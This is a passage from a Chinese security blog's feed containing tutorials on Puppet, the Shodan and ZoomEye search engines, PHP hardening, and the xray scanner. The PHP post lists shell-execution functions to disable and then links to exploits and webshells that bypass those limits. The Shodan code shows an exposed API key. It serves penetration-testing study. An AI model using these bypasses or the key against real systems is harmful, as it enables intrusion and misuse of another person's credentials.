vnc的加密强度没有ssh高，所以，尝试：先建立ssh隧道，再在隧道的基础上建立图形化的连接</p><h2 id="PUPPET"><a href="#PUPPET" class="headerlink" title="PUPPET"></a><font color="red">PUPPET</font></h2><p>也是一个远程管理工具，可以不登录到被管理服务器上<br>利用puppet的服务端(我的机器)来管理puppet的客户端(安装在远程服务器上)，进行批量管理…  </p><p>全生命周期的远程管理方案  </p><ul><li>软件安装部署(可以写一个脚本，然后批量下发给安装有puppet客户端的服务器上)</li><li>权限设置</li><li>账号管理</li><li>支持云平台</li><li>支持容器(Docker)</li><li>适合大量服务器管理</li></ul><p><strong>准备</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里以两台机器做实验</span></span><br><span class="line"><span class="comment"># 为了区分，改一下两台计算机名</span></span><br><span class="line">hostnamectrl <span class="built_in">set</span>-hostname puppet</span><br><span class="line">hostnamectrl <span class="built_in">set</span>-hostname client</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改hosts文件，修改解析域名(这个随便起) -- 两台机器都要修改</span></span><br><span class="line">vim /etv/hosts</span><br><span class="line">192.168.1.10puppet.lab.compuppet</span><br><span class="line">192.168.1.11client.lab.comclient</span><br><span class="line"><span class="comment"># 其他行都删掉就行</span></span><br><span class="line"><span class="comment"># 可以在dns服务器上修改，这里通过hosts修改域名解析只是权宜之计(下一章学完DNS之后就在dns服务器修改域名的解析)</span></span><br></pre></td></tr></table></figure></p><p><strong>安装</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装puppet服务端程序</span></span><br><span class="line">sudo apt install puppetmaster </span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装puppet客户端程序</span></span><br><span class="line">sudo apt install puppet</span><br></pre></td></tr></table></figure></p><p><strong>配置</strong><br>服务端配置-1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/puppet</span><br><span class="line">sudo mkdir -p modules/apache2/manifests  <span class="comment"># manifests 目录下面就是资源文件</span></span><br><span class="line">touch init.pp</span><br><span class="line"><span class="comment"># sudo vim /etc/puppet/modules/apache2/manifests/init.pp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 比如要给下面的机器安装apache, </span></span><br><span class="line"><span class="comment"># 一组资源就是一个类</span></span><br><span class="line">class apache2&#123;</span><br><span class="line">package&#123;<span class="string">'apache2'</span>:   <span class="comment"># 软件包</span></span><br><span class="line">ensure=&gt;installeds,</span><br><span class="line">&#125;</span><br><span class="line">service&#123;<span class="string">'apache2'</span>:   <span class="comment"># apache的服务是否启动</span></span><br><span class="line">ensure=&gt;ture,</span><br><span class="line">ensure=&gt;ture,</span><br><span class="line">require=&gt;Package[<span class="string">'apache2'</span>],  <span class="comment"># 包的名称</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>服务端配置-2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上面的配置文件定义了资源，那么这里确定要给哪些服务器安装哪个资源</span></span><br><span class="line"><span class="comment"># 选择哪个资源</span></span><br><span class="line"><span class="built_in">cd</span> manifests</span><br><span class="line">touch site.pp</span><br><span class="line"></span><br><span class="line"><span class="comment"># sudo vim /etc/puppet/manifests/site.pp</span></span><br><span class="line"><span class="comment"># 解析这个节点(通过域名解析到对应ip,只要那些计算机在这个域名即可)</span></span><br><span class="line">node <span class="string">'client.lab.com'</span> &#123;</span><br><span class="line">include apache2   <span class="comment"># 选择下发哪些资源。这里以推送apache2资源为例</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line">systemctl restart puppetmaster.service</span><br></pre></td></tr></table></figure></p><p>客户端配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># puppet的客户端和服务端是通过证书来通信等操作的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sudo vim /etc/default/puppet          默认没有，自己新建</span></span><br><span class="line">START=yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务（会自动向puppet服务端发起请求申请证书）</span></span><br><span class="line">systemctl restart puppet.service</span><br></pre></td></tr></table></figure></p><p>客户端证书前面请求测试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在查看客户端的指纹信息</span></span><br><span class="line">sudo puppet agent --figerprint</span><br><span class="line"><span class="comment"># 服务端下面下发证书后，然后在客户端测试一下，获取证书</span></span><br><span class="line">sudo puppet agent --<span class="built_in">test</span></span><br></pre></td></tr></table></figure></p><p>服务端请求查看签名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在服务端查看哪些客户端跟我发起证书请求了</span></span><br><span class="line">sudo puppet cert list</span><br><span class="line"><span class="comment"># 在服务端使用自己的私钥给对应的机器进行签名(sign)</span></span><br><span class="line">sudo puppet cert sign client.lab.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端查看证书下发进度： sudo puppet agent --test</span></span><br></pre></td></tr></table></figure></p><p>完成上面的步骤(资源的下发配置，证书的请求与签名下发，重启服务)之后，在客户端查看<code>apache2</code>的服务已经安装好并启用了</p><p>日志状态信息查看<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">systemctl status puppet.service</span><br><span class="line"></span><br><span class="line">/var/<span class="built_in">log</span>/syslog</span><br></pre></td></tr></table></figure></p><p>上面关于puppet只是简单的一小部分，后续高级用法，请自行探索</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第七章-远程管理&quot;&gt;&lt;a href=&quot;#第七章-远程管理&quot; class=&quot;headerlink&quot; title=&quot;第七章-远程管理&quot;&gt;&lt;/a&gt;第七章-远程管理&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;看我遥控你&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;远
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="Ubuntu" scheme="http://www.xpshuai.cn/tags/Ubuntu/"/>
    
      <category term="远程管理" scheme="http://www.xpshuai.cn/tags/%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>黑暗引擎</title>
    <link href="http://www.xpshuai.cn/%E9%BB%91%E6%9A%97%E5%BC%95%E6%93%8E/"/>
    <id>http://www.xpshuai.cn/黑暗引擎/</id>
    <published>2020-03-29T05:22:23.000Z</published>
    <updated>2020-03-29T05:46:59.426Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一-shodan"><a href="#一-shodan" class="headerlink" title="一. shodan"></a>一. shodan</h4><h6 id="1-简单介绍"><a href="#1-简单介绍" class="headerlink" title="1.简单介绍"></a>1.简单介绍</h6><p>Shodan，是一个暗黑系的谷歌，作为一个针对网络设备的搜索引擎，它可以在极短的时间内在全球设备中搜索到你想找的设备信息。对于渗透工作者来说，就是一个辅助我们寻找靶机的好助手。</p><h6 id="2-内置语法"><a href="#2-内置语法" class="headerlink" title="2.内置语法"></a>2.内置语法</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Shodan的参数有很多，这里只介绍简单的几种</span></span><br><span class="line">hostname：<span class="string">"主机或域名"</span></span><br><span class="line">如 hostname:<span class="string">"google''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">port："</span>端口或服务<span class="string">"</span></span><br><span class="line"><span class="string">如 port:"</span>21<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ip : "</span>ip地址<span class="string">"</span></span><br><span class="line"><span class="string">如 ip : "</span>168.205.71.64<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">net："</span>IP地址或子网<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如 net:"</span>210.45.240.0/24<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">vuln :指定漏洞的cve</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如 vuln:CVE-2015-8869</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">但是这个命令最好搭配起来使用，如 country:CN vuln:CVE-2014-0160</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">os :"</span>操作系统<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">​ 如 os:"</span>centOS<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">isp："</span>ISP供应商<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如 isp:"</span>China Telecom<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">product："</span>操作系统/软件/平台<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如 product:"</span>Apache httpd<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">version："</span>软件版本<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如 version:"</span>3.1.6<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">geo："</span>经纬度<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如 geo:"</span>39.8779,116.4550<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">country`："</span>国家<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如 country:"</span>China<span class="string">"</span></span><br><span class="line"><span class="string">country:"</span>UN<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">city："</span>城市<span class="string">"</span></span><br><span class="line"><span class="string">如 city:"</span>Hefei<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">org："</span>组织或公司<span class="string">"</span></span><br><span class="line"><span class="string">如 org:"</span>google<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">before/after："</span>日/月/年<span class="string">"</span></span><br><span class="line"><span class="string">如 before:"</span>25/09/2017<span class="string">"</span></span><br><span class="line"><span class="string">after:"</span>25/09/2017<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">asn : "</span>自治系统号码<span class="string">"</span></span><br><span class="line"><span class="string">如 asn:"</span>AS2233<span class="string">"</span></span><br></pre></td></tr></table></figure><h6 id="3-脚本使用-（建议使用本地脚本，也可自主开发）"><a href="#3-脚本使用-（建议使用本地脚本，也可自主开发）" class="headerlink" title="3.脚本使用  （建议使用本地脚本，也可自主开发）"></a>3.脚本使用  （建议使用本地脚本，也可自主开发）</h6><pre><code>项目地址：https://github.com/achillean/shodan-python</code></pre><p>先clone, python setup.py install, shodan init 秘钥_value,然后可以在命令行用了就<br><code>shodan search product:&quot;apache&quot;</code>  只不过显示方式不友好</p><p>拓展：自主开发</p><pre><code>官方文档：https://shodan.readthedocs.io/en/latest/index.html</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> shodan <span class="keyword">import</span> Shodan</span><br><span class="line"></span><br><span class="line">api = Shodan(<span class="string">"cUNKhp6cIaN7J4Y9hXnBtbtT8bd9SKCf"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lookup an IP</span></span><br><span class="line">ipinfo = api.host(<span class="string">'8.8.8.8'</span>)</span><br><span class="line">print(ipinfo)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Search for websites that have been "hacked"</span></span><br><span class="line"><span class="keyword">for</span> banner <span class="keyword">in</span> api.search_cursor(<span class="string">'ch1_http相关.title:"hacked by"'</span>):</span><br><span class="line">    print(banner)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the total number of industrial control systems services on the Internet</span></span><br><span class="line">ics_services = api.count(<span class="string">'tag:ics'</span>)</span><br><span class="line">print(<span class="string">'Industrial Control Systems: &#123;&#125;'</span>.format(ics_services[<span class="string">'total'</span>]))</span><br></pre></td></tr></table></figure><h6 id="案例测试："><a href="#案例测试：" class="headerlink" title="案例测试："></a>案例测试：</h6><p>1.phpstudy采集<br>头部信息 <code>Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9</code></p><p>2.子域名信息采集<br><code>hostname:&quot;xps.cn&quot;</code></p><p>3.特定漏洞靶机采集<br><code>vuln:CVE-2020-1983</code> 普通用户没权限用</p><h4 id="二-zoomeye"><a href="#二-zoomeye" class="headerlink" title="二. zoomeye"></a>二. zoomeye</h4><blockquote><p>对国内更贴近一些</p></blockquote><h6 id="内置语法"><a href="#内置语法" class="headerlink" title="内置语法"></a>内置语法</h6><pre><code>ZoomEye搜索技巧指定搜索的组件以及版本app：组件名称ver：组件版本例如：搜索 apache组件    版本2.4app:apache ver:2.4指定搜索的端口port:端口号例如：搜索开放了SSH端口的主机port:22一些服务器可能监听了非标准的端口。要按照更精确的协议进行检索，可以使用service进行过滤。指定搜索的操作系统OS:操作系统名称例如：搜索Linux操作系统OS：Linux指定搜索的服务service：服务名称例如，搜素SSH服务Service：SSH指定搜索的地理位置范country：国家city：城市名例如：country:Chinacity：Beijing搜索指定的CIDR网段CIDR:网段区域例如：CIDR：192.168.158.12/24搜索指定的网站域名Site:网站域名例如：site:www.baidu.com搜索指定的主机名Hostname:主机名例如：hostname:zwl.cuit.edu.cn搜索指定的设备名Device：设备名例如：device:router搜索具有特定首页关键词的主机Keyword：关键词例如：keyword:technology</code></pre><h6 id="脚本开发-多语言开发"><a href="#脚本开发-多语言开发" class="headerlink" title="脚本开发(多语言开发)"></a>脚本开发(多语言开发)</h6><pre><code>官方手册:https://www.zoomeye.org/doc</code></pre><p>1.登录授权<br>2.请求搜索<br>3.回显数据</p><h4 id="补充：谷歌黑客高级玩法"><a href="#补充：谷歌黑客高级玩法" class="headerlink" title="补充：谷歌黑客高级玩法"></a>补充：谷歌黑客高级玩法</h4><pre><code>https://www.uedbox.com/shdb/https://www.uedbox.com/post/54776/</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;一-shodan&quot;&gt;&lt;a href=&quot;#一-shodan&quot; class=&quot;headerlink&quot; title=&quot;一. shodan&quot;&gt;&lt;/a&gt;一. shodan&lt;/h4&gt;&lt;h6 id=&quot;1-简单介绍&quot;&gt;&lt;a href=&quot;#1-简单介绍&quot; class=&quot;header
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="黑暗引擎" scheme="http://www.xpshuai.cn/tags/%E9%BB%91%E6%9A%97%E5%BC%95%E6%93%8E/"/>
    
  </entry>
  
  <entry>
    <title>PHP常见安全设置</title>
    <link href="http://www.xpshuai.cn/PHP%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE/"/>
    <id>http://www.xpshuai.cn/PHP常见安全设置/</id>
    <published>2020-03-29T05:20:58.000Z</published>
    <updated>2020-03-29T05:46:59.421Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP-INI与WEB安全"><a href="#PHP-INI与WEB安全" class="headerlink" title="PHP.INI与WEB安全"></a>PHP.INI与WEB安全</h2><h3 id="四种防护"><a href="#四种防护" class="headerlink" title="四种防护"></a>四种防护</h3><h4 id="1-magic-quotes-gpc"><a href="#1-magic-quotes-gpc" class="headerlink" title="1.magic_quotes_gpc"></a>1.magic_quotes_gpc</h4><p>魔术引号：<code>过滤转义</code>四种字符（），对于sql注入有过滤作用</p><p><strong>绕过：</strong> 特定条件下可以尝试<code>宽字节注入</code>     </p><h4 id="2-safe-mod"><a href="#2-safe-mod" class="headerlink" title="2.safe_mod"></a>2.safe_mod</h4><blockquote><p>安全模式，官方自带的</p></blockquote><p><strong>安全模式：</strong>  禁止php中敏感函数，防御提权及后门调用，漏洞利用<br>一些敏感函数被禁用</p><p>有时候不开安全模式的原因：自己开发中也需要使用到某些敏感函数，不然影响正常应用</p><h4 id="3-open-basedir"><a href="#3-open-basedir" class="headerlink" title="3.open_basedir"></a>3.open_basedir</h4><p>启用之后： open_basedir=D:\phpstudy\PHPTutorial\WWW`<br>限制后门的访问指定目录（菜刀连上也看不到目录里面）</p><blockquote><p>没办法绕过</p></blockquote><h4 id="4-disable-function"><a href="#4-disable-function" class="headerlink" title="4.disable_function"></a>4.disable_function</h4><p>可<code>自定义禁用函数</code>：安全模式(safe_mod)升级版，可自定义函数禁用，更加灵活</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dl, exec, system, passthru, popen, proc_open, pcntl_exec, shell_exec, mail, imap_open, imap_mail, putenv, ini_set, apache_setenv, symlink, link</span><br></pre></td></tr></table></figure><p>举例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">disable_function = <span class="keyword">eval</span>,system,fopen,fread,readdir,init_set    <span class="comment">//比如禁用某指定函数的做法</span></span><br><span class="line"><span class="comment">// 可以直接封杀大马小马等后门disable_functiondisable_function</span></span><br></pre></td></tr></table></figure><h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><p>disable_function的突破:</p><h6 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a><strong>方法1：</strong></h6><p>蚁剑及插件(绕过disable_function)使用, 加载插件<br>插件会保存到antData/plugin目录<br>现在好像已经不用自己下载这个插件了</p><blockquote><p>参考文章:  <a href="https://www.cnblogs.com/linuxsec/articles/10966675.html" target="_blank" rel="noopener">https://www.cnblogs.com/linuxsec/articles/10966675.html</a></p></blockquote><h6 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a><strong>方法2：</strong></h6><p> 针对php7.x:（不支持windows）<br><a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a></p><h6 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a><strong>方法3：</strong></h6><p> 脚本集合：<br><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">https://github.com/l3m0n/Bypass_Disable_functions_Shell</a><br><a href="http://webshell8.com/down/phpwebshell.zip" target="_blank" rel="noopener">http://webshell8.com/down/phpwebshell.zip</a></p><h6 id="方法4："><a href="#方法4：" class="headerlink" title="方法4："></a><strong>方法4：</strong></h6><p>一些webshell自带绕过功能</p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>目录权限<br>文件解析</p><p>… …</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PHP-INI与WEB安全&quot;&gt;&lt;a href=&quot;#PHP-INI与WEB安全&quot; class=&quot;headerlink&quot; title=&quot;PHP.INI与WEB安全&quot;&gt;&lt;/a&gt;PHP.INI与WEB安全&lt;/h2&gt;&lt;h3 id=&quot;四种防护&quot;&gt;&lt;a href=&quot;#四种防护&quot;
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="php.ini" scheme="http://www.xpshuai.cn/tags/php-ini/"/>
    
  </entry>
  
  <entry>
    <title>xray简单学习</title>
    <link href="http://www.xpshuai.cn/xray%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.xpshuai.cn/xray简单学习/</id>
    <published>2020-03-29T05:12:01.000Z</published>
    <updated>2020-03-29T05:46:59.423Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xray学习"><a href="#xray学习" class="headerlink" title="xray学习"></a>xray学习</h1><p>平时使用<code>webscan</code>是最多的</p><p>结合基础爬虫</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xray.exe webscan --basic-crawler http://xxxxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有弊端（爬虫是不受我们控制的。如果是代理就行了:我们点哪里就扫哪里）</span></span><br></pre></td></tr></table></figure><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p><img src="/xray简单学习/20200324221026288_27825.png" alt></p><h6 id="设置代理步骤"><a href="#设置代理步骤" class="headerlink" title="设置代理步骤"></a>设置代理步骤</h6><p><img src="/xray简单学习/20200324221232431_2609.png" alt></p><p>其中，证书的生成(只要程序位置不变，证书就不需要重新安装)：<code>ca.crt</code>, 然后安装证书</p><p>生成报告后(可以边扫边看)，点击对应条目，我们可以看到具体的请求/响应信息等</p><h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><h4 id="1-常用配置"><a href="#1-常用配置" class="headerlink" title="1.常用配置"></a>1.常用配置</h4><blockquote><p>配置文件：config.yaml</p></blockquote><h6 id="允许扫描的域"><a href="#允许扫描的域" class="headerlink" title="允许扫描的域"></a>允许扫描的域</h6><ul><li>Mitm -&gt; Restriction<br>默认会把所有流量扫描，可以指定我们想要扫描的域名的流量<br>includes允许扫描的域，<code>*</code>表示任意；excludes不允许扫描的域</li></ul><h6 id="为代理添加认证"><a href="#为代理添加认证" class="headerlink" title="为代理添加认证"></a>为代理添加认证</h6><ul><li>Mitm -&gt;auth<br>如果把xray放到公网上，别人也可以使用，我们就需要设置账号密码</li></ul><h6 id="扫描插件配置"><a href="#扫描插件配置" class="headerlink" title="扫描插件配置"></a>扫描插件配置</h6><ul><li>Plugins<br>插件可以打开(<code>enable:true</code>)和关闭(<code>false</code>),也可以自定义字典等<br>或者直接在命令行指定启用哪些插件：<code>--plugins xss,xxe</code></li></ul><h6 id="发包速率限制"><a href="#发包速率限制" class="headerlink" title="发包速率限制"></a>发包速率限制</h6><ul><li>http -&gt; max_qps<br>限制扫描速度，防止被waf拉黑</li></ul><h6 id="扫描代理配置"><a href="#扫描代理配置" class="headerlink" title="扫描代理配置"></a>扫描代理配置</h6><ul><li>http -&gt; proxy<br>代理支持以下形式</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#1.http代理</span><br><span class="line">http:</span><br><span class="line">  proxy: &quot;http://127.0.0.1:8080&quot; # 漏洞扫描时使用的代理</span><br><span class="line"></span><br><span class="line">#2.socks代理</span><br><span class="line">http:</span><br><span class="line">  proxy: &quot;socks5://127.0.0.1:1111&quot; # 漏洞扫描时使用的代理</span><br></pre></td></tr></table></figure><p><strong>log如果改成<code>debug</code>，可以看到具体发包请求详情：</strong><br><img src="/xray简单学习/20200325112117165_16385.png" alt></p><p><strong>也可以设置cookie</strong></p><p>大致配置项：<br><img src="/xray简单学习/20200325110843248_31786.png" alt></p><h4 id="2-xray与burp联动使用"><a href="#2-xray与burp联动使用" class="headerlink" title="2.xray与burp联动使用"></a>2.xray与burp联动使用</h4><h6 id="（1）Burpsuite作为xray的上游代理（抓取xray发包来学习）"><a href="#（1）Burpsuite作为xray的上游代理（抓取xray发包来学习）" class="headerlink" title="（1）Burpsuite作为xray的上游代理（抓取xray发包来学习）"></a>（1）Burpsuite作为xray的上游代理（<code>抓取xray发包来学习</code>）</h6><p><img src="/xray简单学习/20200325112636987_388.png" alt></p><p><strong>作用：</strong><br>burp可以拿到xray的数据包（可以学习xray是如何检测的的）</p><p><strong>设置方法：</strong></p><ol><li>xray设置代理: <code>http://127.0.0.1:8080</code></li><li>burp监听8080端口</li><li>启动xray，设置监听端口为<code>--listen 127.0.0.1:1111</code></li><li>浏览器配置代理为<code>1111</code></li></ol><h6 id="（2）xray作为Burpsuite的上游代理（协助测试）"><a href="#（2）xray作为Burpsuite的上游代理（协助测试）" class="headerlink" title="（2）xray作为Burpsuite的上游代理（协助测试）"></a>（2）xray作为Burpsuite的上游代理（<code>协助测试</code>）</h6><p><img src="/xray简单学习/20200325113216771_16871.png" alt></p><p><strong>作用：</strong><br>burp可以选择是否放行，forward之后，可以用xray进行扫描</p><p><strong>设置方法：</strong></p><ol><li>xray配置文件不配置代理</li><li>burp正常设置监听8080端口</li><li>burp打开<code>user option -&gt; Upstream Proxy Server -&gt; 添加为:127.0.0.1:1111</code></li><li>浏览器设置burp代理8080</li><li>启动xray，设置监听端口为<code>--listen 127.0.0.1:1111</code> </li></ol><p><strong>其他方式：</strong><br>使用插件</p><h2 id="使用xray编写自定义poc"><a href="#使用xray编写自定义poc" class="headerlink" title="使用xray编写自定义poc"></a>使用xray编写自定义poc</h2><p>xray是用go语言开发的<br>poc是yaml格式的</p><h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h6><p><img src="/xray简单学习/20200325113912300_8495.png" alt></p><p>每个规则都是http请求，进行改造</p><h6 id="POC构成"><a href="#POC构成" class="headerlink" title="POC构成"></a>POC构成</h6><ul><li>name</li><li>rules：最关键部分。请求方法,路径,表达式(有唯一的返回值)。支持多条(就会发送几条数据包)</li><li>details：漏洞检测成功之后，输出一些提示信息<br><img src="/xray简单学习/poc.png" alt></li></ul><h6 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h6><blockquote><p>看官方文档</p></blockquote><p>vscode和jetBrain都行</p><p>vscode安装<code>YAML</code>查看，配置文件<code>setting.json</code>用来校验</p><p>按照上面的格式编写  </p><p>运行：<code>xray.exe webscan --plugins phantasm --poc ./poc-yaml-test.yml --listen 127.0.0.1:1111</code></p><p>对单个url扫描：<br><code>--url 